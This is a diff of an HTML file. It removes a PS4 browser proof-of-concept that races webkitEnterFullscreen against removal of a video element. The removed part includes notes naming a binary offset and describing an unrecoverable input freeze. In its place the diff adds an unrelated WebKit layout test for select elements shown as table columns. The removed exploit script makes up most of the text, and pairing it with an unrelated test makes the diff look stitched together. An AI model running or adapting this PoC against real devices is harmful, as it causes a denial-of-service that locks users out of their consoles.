@@ -1,148 +1,23 @@
-<!-- 
-PRE-remove  | displayingFS=true | isConnected=true
-
-POST-remove | displayingFS=true | isConnected=false
-
-[EVIDENCE 1] Invalid state in the driver:
-displayingFS=true + isConnected=false: false
-Root cause: pauseAfterDetachedTimerFired() does not call
-exitFullscreen() because m_videoFullscreenMode==0
-Confirmed in libSceNKWebKit.sprx @ 0x1436f70
-
-[EVIDENCE 2] Global driver session lock:
-Clean element (v2) receives InvalidStateError: true
-Error: silently refused fullscreen
-Session lock survives: remove, exitFullscreen, reload
-Unrecoverable without PS Button (hardware)
-
-[EVIDENCE 3] Input subsystem freeze (manual check):
-Press Square  to confirm freeze of the native handler
-Press Options + reload to confirm input lock
-Only the PS Button recovers the system
-
-[EVIDENCE 4] exitFullscreen() does not clear the session lock:
-document.webkitFullscreenElement null: true
-displayingFS persists after exitFullscreen: false
-
-Confirmed evidence:
-
-Invalid state (displayingFS=true + isConnected=false)
-Unrecoverable global session lock
-Root cause in libSceNKWebKit.sprx @ vaddr 0x1436f70
-cmp dword ptr [rbx+0x3d8], 0 — never != 0 for native webkitEnterFullscreen
-Manual check: Square freeze -  Options + reload freeze
-
-Root cause:
-
-pauseAfterDetachedTimerFired() checks m_videoFullscreenMode (offset 0x3d8)
-native webkitEnterFullscreen() never sets m_videoFullscreenMode
-exitFullscreen() never called after remove()
-FullscreenVideoController remains active in the Manx driver -->
-
 <!DOCTYPE html>
 <html>
 <head>
-    <meta charset="utf-8">
-    <title>Manx Driver State Corruption</title>
+<script src="resources/js-test.js"></script>
+<style>
+select, ::picker(select) {
+    appearance: base-select;
+}
+</style>
 </head>
 <body>
-    <h3>PS4 Manx Fullscreen POC</h3>
-    
-    <button id="btn-start">EXECUTE</button>
-    
-    <div id="log"></div>
-
+<select id="column" style="display: table-column"><option>One</option></select>
+<select id="columnGroup" style="display: table-column-group"><option>Two</option></select>
 <script>
-    const SRC = 'teste.mp4';
-    const ATTACK_DELAY = 450; // The bug in the hardcoded IPC window is located in the fullscreen animation window, which has a delay of 500ms.
-    
-  function log(msg) {
-        const l = document.getElementById('log');
-        l.innerHTML += `${msg}<br>`;
-    }
+description("A base-appearance select whose display turns it into a table column must not get a ::picker-icon renderer attached to its RenderTableCol.");
 
-    function logState(tag, element) {
-        if (!element) return;
-        let isFS = !!element.webkitDisplayingFullscreen;
-        let isConn = !!element.isConnected;
-        log(`[${tag}] displayingFS: <b>${isFS}</b> | isConnected: <b>${isConn}</b>`);
-    }
+document.body.offsetHeight;
 
-    document.getElementById('btn-start').addEventListener('click', async () => {
-        document.getElementById('log').innerHTML = '';
-        document.getElementById('btn-start').disabled = true;
-
-        log('[SYSTEM] Initializing Hardware Decoder...');
-        let v1 = document.createElement('video');
-        v1.src = SRC;
-        v1.autoplay = true;
-        document.body.appendChild(v1);
-
-        // Espera o motor de hardware carregar o arquivo
-        await new Promise(r => setTimeout(r, 800));
-
-        log('[SYSTEM] Requesting Fullscreen...');
-        try { 
-            v1.webkitEnterFullscreen(); 
-        } catch(e) { 
-            log('[ERROR] Failed to enter Fullscreen: ' + e.message);
-            return;
-        }
-
-        // Janela crítica de 80ms para o Teardown
-        await new Promise(r => setTimeout(r, ATTACK_DELAY));
-
-        
-        logState("PRE-TEARDOWN", v1);
-
-        // Execução do Teardown
-        v1.removeAttribute('src');
-        v1.load();
-        v1.remove();
-
-        logState("POST-TEARDOWN", v1);
-
-        // Aguarda o processamento da fila de eventos
-        await new Promise(r => setTimeout(r, 500));
-        v1 = null;
-
-        log('[SYSTEM] Verifying UIProcess State...');
-        const v2 = document.createElement('video');
-        v2.src = SRC;
-        document.body.appendChild(v2);
-        
-        let gotInvalidState = false;
-        
-        try { 
-            v2.webkitEnterFullscreen(); 
-        } catch(e) { 
-            if(e.name === 'InvalidStateError') {
-                gotInvalidState = true;
-            }
-        }
-        v2.remove();
-
-        // --- LINHA ADICIONADA AQUI ---
-        log(`[NATIVE ERROR] InvalidStateError: <b>${gotInvalidState}</b>`);
-        // ----------------------------
-
-        if (gotInvalidState) {
-            log('<span style="color: red; font-weight: bold;">[RESULT] Driver in an inconsistent state.</span>');
-            
-            setTimeout(() => {
-                log('[SYSTEM] Triggering Deadlock (exitFullscreen)...');
-                try { 
-                    document.webkitExitFullscreen(); 
-                } catch(err) {
-                    log('[INFO] UIProcess stopped responding.');
-                }
-            }, 1000);
-        } else {
-            log('[ERROR] The system synchronized the state correctly. Try adjusting the delay.');
-            document.getElementById('btn-start').disabled = false;
-        }
-    });
+shouldBeEqualToString('getComputedStyle(document.getElementById("column")).display', 'table-column');
+shouldBeEqualToString('getComputedStyle(document.getElementById("columnGroup")).display', 'table-column-group');
 </script>
-
 </body>
 </html>
